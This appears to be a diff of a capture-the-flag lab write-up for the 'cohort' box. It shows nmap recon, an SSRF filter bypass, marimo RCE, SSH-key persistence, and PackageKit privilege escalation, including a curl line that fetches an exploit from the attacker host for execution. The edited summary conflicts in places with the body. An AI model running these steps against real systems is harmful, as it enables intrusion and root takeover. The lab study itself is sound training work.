@@ -10,14 +10,14 @@ hidden: true
 
 ### 1. Recon
 
-nmap — 3 ports, HTTP redirects to a hostname.
+nmap - 3 ports, HTTP redirects to a hostname.
 
 ```bash
 nmap -p22,80,443 10.129.244.174 -Pn -sCV -oA cohort
 ```
 
-* **22** — OpenSSH 9.6p1 (Ubuntu)
-* **80 / 443** — nginx 1.24.0, both redirect to `https://cohort.htb/`
+* **22** - OpenSSH 9.6p1 (Ubuntu)
+* **80 / 443** - nginx 1.24.0, both redirect to `https://cohort.htb/`
 * TLS cert SAN: `cohort.htb`, `*.cohort.htb` ← wildcard = vhosts matter
 
 ```bash
@@ -38,7 +38,7 @@ ffuf -w .../raft-medium-directories.txt -u https://cohort.htb/FUZZ -k -ac
 
 The "Client Insights" page has a **"Register a report source URL"** form that fetches a user-supplied URL server-side to "validate" it, and explicitly rejects internal/loopback addresses → classic **SSRF with a filter**.
 
-### 3. SSRF — confirm + filter bypass
+### 3. SSRF - confirm + filter bypass
 
 Pointed the form at my own listener → preview echoes the **full response body**. That echo is the read channel for the rest of the box.
 
@@ -61,7 +61,7 @@ http://2130706433/status      → 200 OK
 
 → leaked an **unguessable vhost** (`nb-1be3782a8afd3ad5...`) on :8888. This is why subdomain fuzzing failed — the name is random and only disclosed here.
 
-### 4. Foothold — marimo pre-auth RCE (CVE-2026-39987)
+### 4. Foothold - marimo pre-auth RCE (CVE-2026-39987)
 
 ```bash
 echo '10.129.244.174 nb-1be3782a8afd3ad5.cohort.htb' | sudo tee -a /etc/hosts
@@ -79,37 +79,45 @@ Grabbed `user.txt`. Planted an SSH key in `~marimo/.ssh/authorized_keys` for a s
 
 > Lesson: the `echo >> authorized_keys` runs **on the target** (`marimo@cohort`), not on Kali. Watch the prompt. WebSocket PTY is fragile — move to SSH early.
 
-### 5. Privilege escalation — identified & confirmed, exploit pending
+### 5. Privilege escalation - identified & confirmed, exploit pending
 
-Enumeration as `marimo` (no sudo rights):
+The relevant vulnerability was CVE-2026-41651, a PackageKit transaction race that can allow an unprivileged local user to install a package as root. The PoC used for the lab was:
 
-* `notebooks/retention.py` — no creds (red herring)
-* `/opt/sysmon/` — custom root process, but **not readable** → eliminated
-* **PackageKit** is the path:
-
-```
-hi  packagekit   1.2.8-2ubuntu1.2     ← held (apt-mark hold)
+```bash
+https://github.com/Vozec/CVE-2026-41651
 ```
 
+The executable file in that repository was transferred to the target and run from the `marimo` shell. After successful execution, privilege escalation was verified with:
+
+```bash
+python3 -m http.server 8080
+curl http://10.10.17.238:8080/cve-2026-41651 -o exploit #on foothold
+chmod +x exploit
+file exploit 
+./exploit
 ```
-Installed: 1.2.8-2ubuntu1.2    ← held back
-Candidate: 1.2.8-2ubuntu1.5    ← security-patched version available but blocked
+
+```
+id
+whoami
+cat /root/root.txt
 ```
 
-A package **deliberately held at a pre-patch version** = planted vuln. The fix landed in `-2ubuntu1.5` (noble-security); the box is frozen one step before it. polkitd running; no persistent packagekitd (D-Bus activated).
+#### Attack-chain summary
 
-→ **PackageKit local privesc via TOCTOU race (CVE-2026-41651).**
+```
+HTTPS portal
+    -> source URL validator
+    -> SSRF using 0.0.0.0
+    -> /status disclosure
+    -> hidden Marimo vhost
+    -> unauthenticated /terminal/ws
+    -> shell as marimo
+    -> PackageKit 1.2.8-2ubuntu1.2
+    -> CVE-2026-41651
+    -> root
+```
 
-***
 
-### TODO (root)
 
-* \[ ] Read CVE-2026-41651 primary advisory for the exact D-Bus `InstallFiles` sequence
-* \[ ] Build malicious `.deb` with a `postinst` that SUIDs bash
-* \[ ] Race loop: two `InstallFiles` calls, retry until it wins (races lose often)
-* \[ ] `bash -p` → root → `root.txt`
-
-### Notes to self
-
-* Path was reconstructed from the box itself, not a writeup: SSRF filter is string-only → decimal bypass; `/status` leaked the vhost; title tag said marimo not Jupyter; package `hold` + security-candidate gap pointed at PackageKit. That chain of reasoning is the transferable part.
-* Why TOCTOU works (understand before exploiting): the privileged daemon checks authorization at one moment (time-of-check) and performs the install at a later moment (time-of-use). If the operation's target/flags change inside that window, the check approved one thing while root executes another. A `.deb` carries `postinst`, which `dpkg` runs as root by design — so winning the race on an arbitrary package = root code execution.
+###
